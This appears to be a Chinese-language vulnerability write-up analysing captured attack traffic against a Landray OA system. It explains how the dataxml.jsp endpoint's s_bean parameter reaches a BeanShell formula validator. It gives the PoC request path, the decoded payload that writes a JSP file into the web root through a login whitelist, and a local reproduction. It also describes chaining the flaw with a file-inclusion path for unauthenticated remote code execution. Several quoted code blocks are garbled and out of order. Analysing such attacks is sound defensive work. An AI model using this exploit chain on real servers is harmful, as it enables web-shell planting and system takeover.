HVV⾏动之某OA流量应急(⼀): https://www.anquanke.com/post/id/239865
蹭⼀波⽔哥的热度 OA还得看⽔系群友。
⼚商已发布版本补丁完成修复，建议⽤户尽快更新⾄最新版本
某凌OA任意代码执⾏
先看⼀下捕获到的POC:
/sys/common/dataxml.jsp?s_bean=sysFormulaValidate&script=
&type=int&modelName=test
漏洞出现在 /sys/common/dataxml.jsp 下。
同样类型还有⼀个 sys/common/datajson.jsp
代码:
 parseObj =(Map)node;
JSONObject json=new JSONObject(); 
for(String key1 : parseObj.keySet()){
Object value1=parseObj.get(key1);
json.accumulate(key1, value1);
}
jsonArray.add(json);
  }else if(node instanceof Object[]){
nodeList = (Object[])node;
JSONObject json=new JSONObject(); 
for(int k=0; k
request.getParameter("s_bean").split(";");
接收⼀个参数。 s_bean ,然后以 ; 进⾏分割传给 beanList .往下⾛，看程序是如何
处理 beanList 的值。
第27⾏中，循环 beanList 的值。传递给 ctx.getBean() ⽅法。到这⾥⼤概就明⽩
了， beanList 的值是 beanId ，后⾯通过 getBean() 实例化 JavaBean 。
result = treeBean.getDataList(requestInfo);
treeBean 是 JavaBean 实例化后的对象名。后调⽤ getDataList ⽅法。并传递⼀
个 RequestContext 进去。
说⽩了就是任意Bean调⽤ 但是必须含有 getDataList ⽅法且需实现 IXMLDataBean
接⼝
捕获到的数据流中， s_bean 的值为 sysFormulaValidate .根据配置⽂
件。 sysFormulaValidate 所对应的类
为 com.landray.kmss.sys.formula.web.SysFormulaValidate  
查看 getDataList ⽅法
public List getDataList(RequestContext requestInfo) throws 
Exception {
    List> rtnVal = new ArrayList();
    Map node = new HashMap();
    String msg = null;
    String confirm = null;
    try {
    try {
      String script = requestInfo.getParameter("script");
      String type = requestInfo.getParameter("returnType");
      String funcs = requestInfo.getParameter("funcs");
      String model = requestInfo.getParameter("model");
      FormulaParser parser = FormulaParser.getInstance(requestInfo,  
          new ValidateVarGetter(null), model);
      if (StringUtil.isNotNull(funcs)) {
        String[] funcArr = funcs.split(";");
        for (int i = 0; i  funcScriptMap = new 
HashMap();
      for (int index = rightScript.indexOf("$"); index > -1; index 
= rightScript
        .indexOf("$")) {
        int nxtIndex = rightScript.indexOf("$", 
            index + 1);
        if (nxtIndex == -1)
          break; 
        String varName = rightScript.substring(index + 1, 
nxtIndex);
        leftScript.append(rightScript.substring(0, index));
        rightScript = rightScript.substring(nxtIndex + 1);
        if (rightScript.length() > 0 && rightScript.charAt(0) == 
    return rtnVal;
  }
}
'(') {
          FunctionScript funcScript = funcScriptMap.get(varName);
          if (funcScript == null)
            for (int i = 0; i  -1; index = 
rightScript
        .indexOf("$")) {
看了下捕获到的POC:
解码后的内容就是:
import java.lang.*;
import java.io.*;Class 
cls=Thread.currentThread().getContextClassLoader().loadClass("bsh.I
nterpreter");
String 
path=cls.getProtectionDomain().getCodeSource().getLocation().getPat
h();
File f=new File(path.split("WEB-INF")[0]+"/loginx.jsp");
f.createNewFile();
FileOutputStream fout=new FileOutputStream(f);
fout.write(new sun.misc.BASE64Decoder().decodeBuffer("aGVsbG8="));
fout.close()
⼤概意思就是。先加载 bsh.Interpreter .在获取当前类所在的路径。然后以 WEB-
INF 进⾏分割。取第⼀个值(也就是⽹站根⽬录)。在下⾯创建⼀个loginx.jsp.然后写
⼊内容。
访问 loginx.jsp 并不会302，因为其⽩名单中存在 login*.jsp
简化⼀下:本地跑⼀遍
import bsh.EvalError;
import bsh.Interpreter;
import java.util.HashMap;
import java.util.Map;
public class main {
    public static void main(String[] args) throws EvalError, 
ClassNotFoundException {
        Interpreter interpreter=new Interpreter();
        String payload="import java.lang.*;\n" +
                "import java.io.*; "+
                "File f=new 
File(\"/Users/yuanhai/Desktop/test/test/1.txt\");\n" +
                "f.createNewFile();\n" +
                "FileOutputStream fout=new FileOutputStream(f);\n" 
+
                "fout.write(new 
sun.misc.BASE64Decoder().decodeBuffer(\"aGVsbG8=\"));\n"+
                "fout.close()";
        interpreter.eval(payload);
    }
}
其实这个洞是后台的，需要已登陆账户去调⽤才可。
但是结合先前的⽂件包含: /sys/ui/extend/varkind/custom.jsp 可以打前台
RCE。